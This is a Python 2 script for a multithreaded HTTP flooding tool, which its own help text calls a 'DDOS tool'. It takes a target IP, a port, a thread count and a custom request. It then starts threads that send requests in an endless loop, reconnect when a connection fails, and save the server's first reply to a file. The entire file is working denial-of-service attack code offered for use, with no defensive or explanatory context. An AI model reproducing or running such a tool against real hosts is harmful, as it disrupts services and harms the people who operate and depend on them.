#! /usr/bin/env python

import socket
import sys
import thread
import argparse
from argparse import RawDescriptionHelpFormatter
import time

threadsstarted = 0
noarg = "None"


parser = argparse.ArgumentParser (description = 'A command-line DDOS tool with customizable HTTP Requests, which supports an unlimited number of concurrent threads.' + '\n' + 'Small and simple, yet extremely powerful when using the right HTTP Requests.' + '\n', formatter_class = RawDescriptionHelpFormatter, epilog = 'This tool has been built and designed by Fabien Sonpar.')
parser.add_argument ('-d', '--destination', help = 'Set target of DDOS attack (IP address required).', required = True)
parser.add_argument ('-t', '--threadamount', help = 'Set amount of threads to concurrently attack the target.', required = True)
parser.add_argument ('-p', '--port', help = 'Set custom port to direct HTTP Requests to. Default port is 80.', required = False)
parser.add_argument ('-r', '--request', help = 'Set custom HTTP Request to send to target.', required = False)
args = parser.parse_args()

	
IP = args.destination
print "[+] IP set to: " + str(IP)


if (str(args.port) != noarg):
	port = int(args.port)
	print "[+] Port successfully set to: " + str(port)
elif (str(args.port) == noarg):
	port = 80
	print "[+] Using default port: " + str(port)

threadamount = int(args.threadamount)
print "[+] Number of threads set to: " + str(threadamount)

if (str(args.request) == noarg):
	HTTP_request = "GET / HTTP/1.0 \r\n\r\n"
	print "[+] Using default HTTP request."
if (str(args.request) != noarg):
	HTTP_request = args.request + "\r\n\r\n"
	print "[+] HTTP request successfully set to: " + str(HTTP_request)

seconds = 5
while (seconds != 0):
	print "\r" + "[+] Commencing in " + str(seconds),
	time.sleep(1)
	seconds -= 1	

if (sys.getsizeof(IP) < 40 or sys.getsizeof(IP) > 52):
	print "[-] Invalid IP address"
	sys.exit(1)
	
def ddos (threadname):
	n = 0
	reconnect = 0
	try:
		s = socket.socket()
		print threadname + ": [+] Connecting to " + IP + "\n"
		s.connect ((IP, port))
	except Exception, error:
		print threadname + ": [-] Error = " + str(error) + "\n"
	while (1):
		try:
			if (reconnect == 1):
				print threadname + ": [+] Reconnecting to " + str(IP) + "..." + "\n"
				s = socket.socket()
				s.connect ((IP, port))
				print threadname + ": [+] Successfully reconnected"
				reconnect = 0
			print threadname + ": [+] " + str(n) + " HTTP requests sent." + "\n"
			s.sendall(HTTP_request)
			if (n == 0):
				print threadname + ": [+] Connection succeeded" + "\n"
				anshttp = s.recv(8092)
				print threadname +  ": [+] Answer from HTTP service: \n" + anshttp + "\n"
				HTTP_answer = open("HTTP_answer.txt", "a")
				HTTP_answer.write(anshttp)
				HTTP_answer.close()
			n+= 1
		except Exception, error:
			print threadname + ": [-] Error = " + str(error) + "\n"
			reconnect = 1
			
while (threadsstarted != threadamount):			
	try:
		thread.start_new_thread (ddos, ("Thread " + str(threadsstarted),))
		threadsstarted += 1
	except Exception, error:	
		print "[-] Error = " + str(error)
		sys.exit(1)	

while 1:
	pass
